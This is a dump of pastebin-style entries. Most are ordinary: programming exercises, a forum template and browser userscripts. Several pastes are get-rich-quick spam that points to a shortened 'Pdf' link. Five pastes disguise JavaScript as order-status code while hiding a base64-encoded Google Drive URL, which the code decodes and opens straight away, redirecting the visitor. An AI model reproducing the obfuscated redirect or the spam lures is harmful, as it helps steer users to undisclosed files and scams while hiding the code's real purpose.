id,title,username,language,date,content
YtX3yrWS,地雷阵 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 07:04:24 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const double PI = acos(-1.0);
const int maxn = 100000 + 100;
struct Node {
    double l, r;
    Node() {}
    Node(double l, double r): l(l), r(r) {}
};

bool operator<(const Node &a, const Node &b) {
    return a.l < b.l;
}

int n;
LL x, y, r;
double k, sum, ll, rr, theta1, theta2;
Node node[maxn];

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n;
    for (int i = 0; i < n; ++i) {
        cin >> x >> y >> r;
        double theta = asin(r / sqrt(x * x + y * y));
        double beta = atan(y * 1.0 / x);
        node[i] = Node(beta - theta, beta + theta);
    }
    sort(node, node + n);
    for (int i = 0; i < n; ++i) {
        if (rr < node[i].l) {
            sum += rr - ll;
            rr = node[i].r;
            ll = node[i].l;
        } else {
            rr = max(node[i].r, rr);
        }
    }
    sum += rr - ll;
    printf(""%.3lf\n"", 1 - sum / (PI / 2));

    return 0;
}
"
s5H76tCy,EARN $900 INSTANTLY 2025⭐ G8,Minek10,JavaScript,Saturday 12th of April 2025 07:03:28 AM CDT," 
Pdf https://tinyurl.com/privguidee


dvZqLZxCWS
"
xhFKPDPH,Market.js,WantingTrae,JavaScript,Saturday 12th of April 2025 07:03:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76335/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WD09Tqf0,Make $1000 15-MINUTES  (BEGINNER) HV,Minek10,JavaScript,Saturday 12th of April 2025 06:50:04 AM CDT," 
Pdf https://tinyurl.com/privguidee


piMy0UViay
"
9tad7D34,Untitled,WantingTrae,JavaScript,Saturday 12th of April 2025 06:47:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56534/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MQkfKQu0,Promocao site,do1v2,JSON,Saturday 12th of April 2025 06:43:03 AM CDT,"[
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#61bfff"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Wario"",
    ""titulo"": ""Nintendo - Gift Card Digital 400 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 400,00""
  }
]"
3j9KXFqM,EARN $900 INSTANTLY 2025 2U,Minek10,JavaScript,Saturday 12th of April 2025 06:36:39 AM CDT," 
Pdf https://tinyurl.com/privguidee


g4RtFVmnmc
"
HR9UzqjJ,Products.js,WantingTrae,JavaScript,Saturday 12th of April 2025 06:32:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79398/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
03Uf8cQf,West World : Register,Kelly-B9978,HTML,Saturday 12th of April 2025 06:31:59 AM CDT,"<!--
[คู่มือการแก้ไขโคด]
สีชื่อ ดาว ลายเซ็น : --west-primary: #9E5F24;

พื้นที่ลายเซ็นมีอัตราส่วน 4:1

ตำแหน่งภาพ : เพิ่ม --west-pos: 50% 50%; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - เลขตัวแรกคือการขยับซ้าย - ขวา โดย 0% = ชิดซ้าย 100% = ชิดขวา
 - เลขตัวแรกคือการขยับขึ้น - ลง โดย 0% = ชิดบน 100% = ชิดล่าง
 
ขนาดภาพ : เพิ่ม --west-size: cover; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - cover คือ ขยายเต็มพื้นที่
 - 100% คือ ขนาดเดิมของรูป
 - มากกว่า 100% คือ ขนาดใหญ่ขึ้น
 - น้อยกว่า 100% คือ ขนาดเล็กลง
-->

<link href=""https://dl.dropbox.com/scl/fi/ubghi6edr8wu7rh93inuu/west-world.css?rlkey=2zbqf4yxybassc685mj08ugtq&st=f9qgdzp5"" rel=""stylesheet"">
<div id=""WestWorld""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""west-box"" id=""west-reg"">
<div class=""west-bg"" style=""--west-primary: #9E5F24;"">
<div class=""west-bd""><tpl></tpl><tpr></tpr><btl></btl><btr></btr>
<div class=""west-flex""><div class=""west-pic"" style=""--west-pic: url(--ลิงก์รูปภาพ--);""></div>
<div class=""west-info"">
<div class=""west-display-name"">(--Display Name--)</div>
<div class=""west-char-name"">--ชื่อตัวละคร--</div>
<div class=""west-gender-age""><div>[b]Gender:[/b] --เพศ--</div><div>[b]Age:[/b] --อายุ--</div></div>
<hr class=""west-star""></div></div>
<div class=""west-content"">
[b]เชื้อชาติ สัญชาติ:[/b] xxx
<hr>
[b]เมืองที่อาศัย:[/b] เมืองวาเลนไทน์ / เซนต์เดนีส / สตรอว์เบอร์รี / โรดส์ / แบล็ก วอเทอร์ (ระบุ 1 เมือง)
<hr>
[b]อาชีพ:[/b] xxx
<hr>
[b]ประวัติตัวละคร:[/b] xxx
<hr>
[b]ลักษณะทางกายภาพ:[/b] xxx
<hr>
[b]ลักษณะทางนิสัย:[/b] xxx
<hr>
[b]ข้อมูลเพิ่มเติม:[/b]
[list]
[*]ข้อมูล 1
[*]ข้อมูล 2
[*]ข้อมูล 3
[/list]
<hr>
<div class=""west-foot"">
<div class=""west-char-info"">
<div>No. 01 (หมายเลขตัวละคร 1 - 3)</div>
<div>Date: dd/MM/yyyy (วันที่ลงสมัคร)</div></div>
<div class=""west-sign-info"">
<div class=""west-sign"" style=""--west-sign: url(--ลิงก์รูปลายเซ็น--);""></div>
(--ชื่อตัวละคร--)</div>
</div></div>
</div></div></div></div>"
9qNWuqtJ,Homework41,JohnJuly,C#,Saturday 12th of April 2025 06:26:12 AM CDT,"using System;
using System.Collections.Generic;

namespace Homework41
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Croupier croupier = new Croupier();

            croupier.IsPlayed();
        }
    }

    class Croupier
    {
        private Deck _deck;

        public Croupier()
        {
            _deck = new Deck();
        }

        public void IsPlayed()
        {
            Player player = new Player();

            const string CommandDealCards = ""deal"";
            const string CommandShowCards = ""show"";
            const string CommandExitProgram = ""exit"";

            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""Вы за игральным столом!!!"");
                Console.WriteLine($""Если хотите сыграть, введите {CommandDealCards} !"");
                Console.WriteLine($""Чтобы показать карты на руке, введите {CommandShowCards} !"");
                Console.WriteLine($""Если хотите выйти из-за стола, введите {CommandExitProgram}"");

                string userInput = Console.ReadLine()?.Trim().ToLower();

                switch (userInput)
                {
                    case CommandDealCards:
                        DealCards(player);
                        break;
                    case CommandShowCards:
                        player.ShowCards();
                        break;
                    case CommandExitProgram:
                        isWork = ExitProgram();
                        break;
                    default:
                        Console.WriteLine(""Неверная команда, попробуйте снова."");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }

        private void DealCards(Player player)
        {
            Console.Write(""Введите количество карт для игрока: "");

            string userInput = Console.ReadLine();
            int numberOfCards;

            if (int.TryParse(userInput, out numberOfCards) && numberOfCards > 0)
            {
                if (numberOfCards <= _deck.CardsRemaining)
                {
                    for (int i = 0; i < numberOfCards; i++)
                    {
                        Card card = _deck.DrawCard();
                        if (card != null)
                        {
                            player.TakeCard(card);
                        }
                    }
                    Console.WriteLine($""{numberOfCards} карт(ы) выданы игроку."");
                }
                else
                {
                    Console.WriteLine(""Недостаточно карт в колоде."");
                }
            }
            else
            {
                Console.WriteLine(""Введено некорректное количество."");
            }
        }

        private bool ExitProgram()
        {
            Console.WriteLine(""Вы вышли из-за стола"");
            return false;
        }
    }

    class Player
    {
        private List<Card> _cardsOnHand;

        public Player()
        {
            _cardsOnHand = new List<Card>();
        }

        public void TakeCard(Card card)
        {
            _cardsOnHand.Add(card);
        }

        public void ShowCards()
        {
            if (_cardsOnHand.Count == 0)
            {
                Console.WriteLine(""У вас нет карт на руке."");
            }
            else
            {
                Console.WriteLine(""Карты на руке:"");
                foreach (var card in _cardsOnHand)
                {
                    card.ShowCard();
                }
            }
        }
    }

    class Deck
    {
        private List<Card> _cards = new List<Card>();
        private Random _random = new Random();

        public Deck()
        {
            FillCards();
            ShuffleCards();
            CardsRemaining = _cards.Count;
        }

        public int CardsRemaining { get; private set; }

        public void FillCards()
        {
            List<string> names = new List<string>
            {
                ""2"", ""3"", ""4"", ""5"", ""6"", ""7"", ""8"", ""9"", ""10"", ""Валет"", ""Дама"", ""Король"", ""Туз""
            };

            List<string> suits = new List<string>
            {
                ""Пики"", ""Черви"", ""Трефы"", ""Бубны""
            };

            foreach (var suit in suits)
            {
                foreach (var name in names)
                {
                    _cards.Add(new Card(name, suit));
                }
            }
        }

        public void ShuffleCards()
        {
            for (int i = 0; i < _cards.Count; i++)
            {
                int j = _random.Next(i, _cards.Count);
                var temp = _cards[i];
                _cards[i] = _cards[j];
                _cards[j] = temp;
            }
        }

        public Card DrawCard()
        {
            if (_cards.Count == 0)
                return null;

            Card card = _cards[0];
            _cards.RemoveAt(0);
            return card;
        }
    }

    class Card
    {
        private string _name;
        private string _suit;

        public Card(string name, string suit)
        {
            _name = name;
            _suit = suit;
        }

        public void ShowCard()
        {
            Console.WriteLine($""Название карты: {_name} | Масть: {_suit}"");
        }
    }
}"
shXPjC1w,Make $1000 15-MINUTES (BEGINNER) FM,Minek10,JavaScript,Saturday 12th of April 2025 06:23:15 AM CDT," 
Pdf https://tinyurl.com/privguidee


ugpBrywJDv
"
R5WVZJt8,Тёплый вязанный список №2,dllbridge,C,Saturday 12th of April 2025 06:23:13 AM CDT,"





#include    <stdio.h>
#include   <stdlib.h>
#include   <locale.h>

///////////////////////////
struct T
{
	
   int      n;
   T   *pNext;	
};


T *pHead  = 0,
  *pTail  = 0;
  

int nX;  
  
 
void  monitor(); 
void _monitor();
 
///////////////////////////////////////////////////// 
int main()                                         // 
{
	
	setlocale(LC_ALL, ""rus""); 
	
	printf(""Введите кол-во элементов: ""); scanf(""%d"", &nX);
	
	T *p;
	
    for(int i = 0; i < nX; i++)
    {
		
		p = (T*)malloc(sizeof(T));
		
		
		
		if(i == 0)   pHead = p;
		else  pTail->pNext = p;
		      pTail        = p;
		      pTail->pNext = 0;

        p->n = i + 100;
	}
	
	monitor();
}



/////////////////////////////////////////////////
void _monitor()                                //
{
	
	 T *p = pHead;
 	 
	 int i = 0;
	 
	 do {  printf(""p->n = %d\n"", p->n);
			
		   p = p->pNext;
			
	    }  while(p);
}



/////////////////////////////////////////////////
void monitor()                                 //
{
	
	 T *p = pHead;
	
	 for(int i = 0; i < nX; i++)
	 {
			
		printf(""%2d) p->n = %d\n"", i, p->n);
			
		p = p->pNext;	
	 }
}


"
S8a6AA49,Order.js,WantingTrae,JavaScript,Saturday 12th of April 2025 06:17:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81530/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fCgqwGDy,EARN $900 INSTANTLY 2025⭐ G8,idogevirtz12,JavaScript,Saturday 12th of April 2025 06:09:34 AM CDT," 
Pdf https://tinyurl.com/privguidee


q7Jn8rwvSx
"
hkbNsn10,Market.js,WantingTrae,JavaScript,Saturday 12th of April 2025 06:01:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38911/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TnW4L9Na,dataNone,TestGuy1,JSON,Saturday 12th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '77b1d07730a7c1b6175adf047494657c8e6af15fe407aa8a6cb033e12219230d640166f88db9747825a157acb042439961730b1fb4b4dcdc42aa7612895b228eaa51ebcd94fb5b6046e28bb7ffa4fefd6da399d1eb2dc4886cd7fdb58a24f4b2a784f259a3b0c03ee98636e17c4b089522d0f1013f5a3ab73b0fd4852be02d7b',
  otherdata: [
    '2441204bc5970c14ffdb9108154d0943',
    '03944acbf336dcf9328ed61048c2e304',
    'af169c09449bbb70cf8a1a2bf0b06b1f',
    '5934fb1f8cf526d49e81dfdfbfeed71a',
    'e6a56e5eeb8fd5d2a7c7c3416fda4c81',
    '40ff3d9f405146cd5380f974e3dcedd6',
    '513d4380e876e33f119a0d2ba2f41dde',
    '80a223a711d1bd201dc40d9e1c7956c0'
  ]
}"
vvEFGe4T,Youtube Chapters Navigator,SheridanCoriana6,JavaScript,Saturday 12th of April 2025 05:53:28 AM CDT,"// ==UserScript==
// @name         Youtube Chapters Navigator
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Simulates CTRL+Arrow key presses when mouse is at screen edges with a 2-second delay
// @match        *://*/*
// @grant        none
// ==/UserScript==
(function() {
    'use strict';
    const EDGE_THRESHOLD = 5; // pixels from edge to trigger the event
    const DELAY = 2000; // delay in milliseconds (2 seconds)
    let lastKeyPressTime = 0;
    function simulateKeyPress(keyCode) {
        const currentTime = Date.now();
        if (currentTime - lastKeyPressTime < DELAY) {
            return; // Don't send another key press if not enough time has passed
        }
        const event = new KeyboardEvent('keydown', {
            bubbles: true,
            cancelable: true,
            keyCode: keyCode,
            ctrlKey: true
        });
        document.dispatchEvent(event);
        lastKeyPressTime = currentTime;
    }
    document.addEventListener('mousemove', function(e) {
        const x = e.clientX;
        const windowWidth = window.innerWidth;
        if (x <= EDGE_THRESHOLD) {
            // Left edge - simulate CTRL + Left Arrow
            simulateKeyPress(37);
        } else if (x >= windowWidth - EDGE_THRESHOLD) {
            // Right edge - simulate CTRL + Right Arrow
            simulateKeyPress(39);
        }
    });
})();"
vjCeL6u5,X (Twitter)- Open post in background,SheridanCoriana6,JavaScript,Saturday 12th of April 2025 05:51:00 AM CDT,"// ==UserScript==
// @name         Otwórz post na Twitterze/X w nowej karcie w tle (minimalna wersja)
// @namespace    http://tampermonkey.net/
// @version      0.9
// @description  Dodaje ikonkę O w prawym górnym rogu każdego posta, która pozwala otworzyć post w nowej karcie w tle
// @author       You
// @match        https://twitter.com/*
// @match        https://x.com/*
// @grant        GM_openInTab
// @grant        GM_addStyle
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    // DEBUG INFO - sprawdź, czy skrypt w ogóle się uruchamia
    console.log(""=== URUCHAMIANIE SKRYPTU 'OTWÓRZ POST NA TWITTERZE/X' v0.9 ==="");

    // Dodaj style dla przycisku bezpośrednio przy uruchomieniu
    GM_addStyle(`
        .tweet-open-btn {
            position: absolute;
            top: 10px;
            right: 0px;
            width: 15px;
            height: 22px;
            // background-color: #1DA1F2;
            background-color: #1e2731;
            color: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
            font-size: 12px;
            cursor: pointer;
            z-index: 9999;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
        }
        .tweet-open-btn:hover {
            background-color: #0c7abf;
        }
    `);

    // Funkcja znajdująca wszystkie tweety/posty
    function processTweets() {
        console.log(""Szukanie postów..."");

        // Szukaj postów po elemencie article
        const articles = document.querySelectorAll('article:not([data-has-open-btn=""true""])');
        console.log(`Znaleziono ${articles.length} nowych postów do przetworzenia`);

        // Przetwórz każdy post
        articles.forEach((article, index) => {
            try {
                // Oznacz post jako przetworzony
                article.setAttribute('data-has-open-btn', 'true');

                // Znajdź link do statusu
                const statusLinks = article.querySelectorAll('a[href*=""/status/""]');

                if (statusLinks.length > 0) {
                    // Weź pierwszy link do statusu
                    const statusLink = statusLinks[0];
                    let statusUrl = statusLink.getAttribute('href');

                    // Utwórz pełny URL jeśli to relatywny link
                    if (statusUrl.startsWith('/')) {
                        statusUrl = window.location.origin + statusUrl;
                    }

                    console.log(`Post #${index+1} - Znaleziono URL: ${statusUrl}`);

                    // Ustaw pozycję relative na article jeśli nie ma
                    const position = window.getComputedStyle(article).position;
                    if (position === 'static') {
                        article.style.position = 'relative';
                    }

                    // Utwórz przycisk
                    const btn = document.createElement('div');
                    btn.className = 'tweet-open-btn';
                    btn.textContent = 'O';
                    btn.title = 'Otwórz post w karcie w tle';

                    // Dodaj obsługę kliknięcia
                    btn.addEventListener('click', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        console.log(`Otwieranie w tle: ${statusUrl}`);
                        GM_openInTab(statusUrl, { active: false });
                    });

                    // Dodaj przycisk do postu
                    article.appendChild(btn);
                    console.log(`Dodano przycisk do postu #${index+1}`);
                }
            } catch (err) {
                console.error(`Błąd podczas przetwarzania postu #${index+1}:`, err);
            }
        });
    }

    // Funkcja inicjalizująca z powtarzalnymi próbami
    function initialize() {
        console.log(""Próba inicjalizacji..."");

        // Wykonaj pierwsze przetwarzanie
        processTweets();

        // Utwórz obserwator mutacji DOM
        const observer = new MutationObserver((mutations) => {
            // Sprawdź czy są nowe elementy i uruchom procesowanie
            const hasNewContent = mutations.some(m => m.addedNodes.length > 0);
            if (hasNewContent) {
                processTweets();
            }
        });

        // Rozpocznij obserwację całego body dla maksymalnego pokrycia
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        console.log(""Obserwator DOM uruchomiony"");

        // Dodatkowo sprawdzaj regularnie czy nie pojawiły się nowe posty
        // (jako zabezpieczenie, gdyby observer nie złapał wszystkich zmian)
        setInterval(processTweets, 3000);

        console.log(""Inicjalizacja zakończona"");
    }

    // Funkcja startowa z wielokrotnymi próbami
    function startScript() {
        console.log(""Rozpoczynam uruchamianie skryptu..."");

        // Sprawdź czy są już jakieś posty
        if (document.querySelectorAll('article').length > 0) {
            console.log(""Wykryto posty - uruchamiam inicjalizację"");
            initialize();
        } else {
            console.log(""Nie wykryto jeszcze postów - czekam 1 sekundę"");
            // Spróbuj ponownie za sekundę
            setTimeout(startScript, 1000);
        }
    }

    // Uruchom proces startowy
    console.log(""Oczekiwanie na załadowanie strony..."");

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            console.log(""DOM załadowany - uruchamianie za 1.5 sekundy"");
            setTimeout(startScript, 1500);
        });
    } else {
        console.log(""DOM już załadowany - uruchamianie za 1 sekundę"");
        setTimeout(startScript, 1000);
    }
})();"
xNXAsqeE,Spotify- Open link in background,SheridanCoriana6,JavaScript,Saturday 12th of April 2025 05:48:50 AM CDT,"// ==UserScript==
// @name         Spotify - Otwórz link w tle (Na dole menu utworu)
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  Dodaje opcję ""Otwórz link w tle"" na końcu menu kontekstowego utworu Spotify.
// @author       Your Name
// @match        https://open.spotify.com/*
// @grant        GM_openInTab
// @grant        GM_addStyle
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    // Optional: Minimal styles if class copying isn't perfect
    GM_addStyle(`
        .custom-background-link-item span { /* Style the inner span if needed */
            /* Example: Add slight padding if text alignment is off */
             /* padding-left: 8px; */
        }
         /* Ensure menu has some padding */
        div[role=""menu""], ul[role=""menu""] {
             padding-top: 4px !important;
             padding-bottom: 4px !important;
        }
    `);

    // --- Store context data ---
    // Defined outside observer/loops
    let trackContextData = {
        url: null,
        targetElement: null // The element that was right-clicked
    };

    // --- Function to handle the click on the custom menu item ---
    // Defined outside the loop to avoid ESLint warning
    function handleMenuItemClick(urlToOpen, clickEvent) {
        clickEvent.stopPropagation();
        clickEvent.preventDefault(); // Prevent default button actions if any
        console.log('[Spotify Background Link] Opening in background:', urlToOpen);
        if (urlToOpen) {
            GM_openInTab(urlToOpen, { active: false, insert: true });
        }
        // Attempt to close the menu - hiding is usually sufficient
        const menuToClose = clickEvent.target.closest('[role=""menu""]');
        if (menuToClose) {
             menuToClose.style.display = 'none';
             // Force removal if hiding doesn't work consistently (might break if parent changes)
             // setTimeout(() => menuToClose.parentElement?.remove(), 50);
        }
        // Clear context data after use (accessing the global is okay here)
        trackContextData = { url: null, targetElement: null };
    }


    // --- Capture right-click event to get track info ---
    document.addEventListener('contextmenu', (e) => {
        // Reset context data before checking the new target
        trackContextData = { url: null, targetElement: null };

        // Find the closest track row ancestor from the clicked element
        const trackRow = e.target.closest('div[data-testid=""tracklist-row""], div.tracklist-row'); // Find the track row itself
        if (trackRow) {
            // Find the link within that specific track row
            const linkElement = trackRow.querySelector('a[data-testid=""internal-track-link""], a[href*=""/track/""]');
            if (linkElement && linkElement.href) {
                trackContextData.url = linkElement.href;
                trackContextData.targetElement = e.target; // Store the element that triggered the context menu
                // console.log('[Spotify Background Link] Context captured:', trackContextData.url);
            } else {
                // console.log('[Spotify Background Link] Track row found, but no track link element within it.');
            }
        } else {
            // console.log('[Spotify Background Link] Right-click was not on or inside a track row.');
        }
    }, true); // Use capture phase

    // --- Observe for context menu appearance ---
    const observer = new MutationObserver((mutations) => {
        for (const mutation of mutations) {
            for (const node of mutation.addedNodes) {
                if (node.nodeType === Node.ELEMENT_NODE) {
                    // Find the menu, could be div or ul
                    let menu = null;
                    if (node.matches && node.matches('[role=""menu""]')) {
                         menu = node;
                    } else if (node.querySelector) {
                         // Sometimes the menu is nested deeper in the added node (e.g., portals)
                         menu = node.querySelector('[role=""menu""]');
                    }

                    // Proceed only if a menu was found, we have a URL from context, and we haven't modified this menu yet
                    // Read the URL from the *current* trackContextData state
                    const currentUrl = trackContextData.url;

                    if (menu && currentUrl && !menu.dataset.customLinkAdded) {
                        // console.log('[Spotify Background Link] Context menu detected:', menu);

                        // Find the ""Dodaj do playlisty"" button *only* to confirm it's the right menu and copy styles
                        const menuItems = menu.querySelectorAll('button[role=""menuitem""]');
                        let referenceButton = null; // Button to copy styles from
                        const targetText = ""Dodaj do playlisty"";

                        for (const item of menuItems) {
                             // Check text content of the button or its inner span
                            const buttonText = (item.textContent || """").trim();
                            const spanText = item.querySelector('span')?.textContent?.trim();

                            if (buttonText.includes(targetText) || (spanText && spanText.includes(targetText))) {
                                referenceButton = item; // Found a good button to copy styles from
                                // console.log('[Spotify Background Link] Found reference button:', referenceButton);
                                break;
                            }
                        }

                        // We need a reference button to copy styles, even if we append at the end
                        if (referenceButton) {
                            // Create the new menu item as a button
                            const newMenuItemButton = document.createElement('button');
                            newMenuItemButton.setAttribute('role', 'menuitem');
                            newMenuItemButton.setAttribute('type', 'button'); // Good practice
